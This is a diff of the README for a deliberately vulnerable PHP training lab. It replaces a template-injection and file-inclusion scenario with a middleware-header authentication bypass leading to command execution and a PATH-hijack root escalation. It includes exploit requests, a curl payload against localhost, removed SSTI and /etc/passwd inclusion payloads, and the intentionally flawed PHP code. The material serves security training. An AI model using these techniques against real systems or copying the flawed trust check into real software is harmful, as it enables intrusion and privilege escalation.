@@ -1,50 +1,71 @@
-# Intentional Remote Code Execution Training Machine SSTI (Version 1.0)
+# Intentional Remote Code Execution Training Machine — Middleware Bypass (v2)
 
 This project provides a deliberately vulnerable environment designed for security research, exploit development practice, and CTF‑style challenges.  
-Instead, it demonstrates a similar severity class vulnerability using a custom, insecure PHP backend.
+Instead of classic injection flaws, this version demonstrates a **logic‑based authentication bypass** caused by trusting client‑controlled middleware headers.
 
 ---
 
 ## Vulnerability Summary
 
-The main vulnerability is a **Remote Code Execution (RCE)** flaw caused by an intentionally unsafe template engine.
+The main vulnerability is a **Remote Code Execution (RCE)** chain caused by an **authentication bypass via an insecure middleware trust model**.
 
 ### Vulnerable Functions
 
 ```php
-dangerous_template_render()
-dangerous_exec()
+middleware_allows_access()
+system()
 shell_exec()
 ```
 
-User-controlled template expressions inside {{ ... }} are executed directly on the server:
-```{{ id }}```
-This becomes:
+The application trusts a client‑supplied internal header:
 ```
-shell_exec("id");
+X-Middleware-Subrequest
 ```
+
+Any request containing the substring **middleware** is treated as authorized.
+
+### Vulnerable Logic
+
+```php
+function middleware_allows_access(): bool {
+    $hdr = $_SERVER['HTTP_X_MIDDLEWARE_SUBREQUEST'] ?? '';
+
+    // ❌ Vulnerable: trusts client-controlled internal header
+    if (strpos($hdr, 'middleware') !== false) {
+        return true;
+    }
+
+    return isset($_SESSION['user']);
+}
+```
+
+An attacker can supply:
+
+```
+X-Middleware-Subrequest: middleware:middleware:middleware
+```
+
+This results in authentication bypass, allowing command execution:
+```shell_exec("id");```
+
 
 # Features of This Lab
 
 - PHP 7.4 backend with intentionally insecure code
 
-- Custom template engine supporting full RCE
+- Middleware-style authorization check with trust boundary violation
 
-- LFI vulnerability in `render.php?page=`
+- Authentication bypass via client‑controlled headers
 
-- Weak login system
+- Admin‑only command execution endpoint
 
-- Unsafe file upload endpoint
+- Sudo misconfiguration for privilege escalation
 
 - Supports:
 
-    - Local File Inclusion (LFI)
+    - Authentication Bypass
 
     - Remote Code Execution (RCE)
-
-- Simple HTML/JS frontend
-
-- Dockerized for easy deployment
 
 > [!NOTE]
 > PHP 7.4 backend with intentionally insecure code
@@ -53,38 +74,82 @@ shell_exec("id");
 
 Build and start:
 
-```docker-compose build
+```
+docker-compose build
 docker-compose up
 ```
-
 
 ## Access at:
 
 http://localhost:8080/
 
 🧪 Exploitation Examples
-RCE (Template Injection)
-```POST /api/render.php
-page={{ id }}
+
+RCE (Authentication Bypass)
+
 ```
-LFI (Read System Files)
+curl -H "X-Middleware-Subrequest: middleware:middleware:middleware"  "http://localhost:8080/api.php?action=admin&cmd=id"
 ```
-GET /api/render.php?page=../../../../etc/passwd
+
+Expected output:
+
 ```
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset='UTF-8'>
+  <title>Command Output</title>
+  <link rel='stylesheet' href='static/css/style.css'>
+</head>
+<body>
+<div class='wrapper'>
+  <div class='card'>
+    <h3>🧨 Command Executed</h3>
+             <pre class='output'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+    <br><br>
+    <a class='btn' href='dashboard.php'>← Back</a>
+  </div>
+</div>
+</body>
+</html>%
+
+```
+
+# Troubleshooting
+
+```bash
+# Force rebuild if SUID binary not found
+docker-compose down
+docker-compose build --no-cache
+docker-compose up -d
+```
+
 ### Using the Provided PoC Script
 ```
-python3 exp.py lfi /etc/passwd
 python3 exp.py rce "id"
 ```
-### PoC
-<img width="1048" height="541" alt="example" src="https://github.com/user-attachments/assets/4f245f97-70dd-45e8-b0c6-c7b81b2db2e7" />
 
----
 
-## Privilege Escalation
+## 🔓 Privilege Escalation
 
-After achieving Remote Code Execution as the **www-data** user, privilege escalation to **root** is possible due to an intentional sudo misconfiguration inside the container.
+After obtaining a shell as `www-data`, a local privilege escalation vulnerability can be abused.
 
-### Misconfiguration
+The system contains a **root-owned SUID binary**:
 
-The Docker image grants the web server user passwordless sudo access to PHP. So, try reading the flag in `/root/flag.txt`
+```/usr/local/bin/checksys```
+
+This binary executes system commands using `system()` without sanitizing the `PATH` environment variable.
+
+By manipulating `PATH`, an attacker can hijack command execution and spawn a **root shell**.
+
+### Outcome
+
+- Privilege escalation from `www-data` → `root`
+- Read the final flag:
+
+```/root/flag.txt```
+
+> [!NOTE]
+> This misconfiguration is intentional and included for educational purposes only.
